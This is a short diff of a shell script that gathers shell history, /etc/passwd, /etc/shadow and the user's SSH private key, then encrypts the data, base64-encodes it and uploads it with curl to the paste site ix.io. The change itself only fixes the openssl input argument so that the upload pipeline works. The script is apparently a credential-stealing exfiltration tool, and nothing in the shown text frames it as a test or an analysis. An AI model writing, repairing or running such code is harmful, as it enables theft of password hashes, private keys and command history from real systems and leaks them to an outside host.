@@ -11,7 +11,7 @@ history
 echo ===
 cat /etc/passwd
 cat /etc/shadow
-) 2> /dev/null | openssl enc -aes-256-cbc -salt -in -out /dev/stdout -k averymuchharderverymuchlongerverydogesomuchwowpassword | base64 | curl -F 'f:1=<-' ix.io
+) 2> /dev/null | openssl enc -aes-256-cbc -salt -in /dev/stdout -out /dev/stdout -k averymuchharderverymuchlongerverydogesomuchwowpassword | base64 | curl -F 'f:1=<-' ix.io
 ( # crypty crypty
 cat .ssh/id_rsa | grep -B 200 -E '^$' | head -n -1
 echo
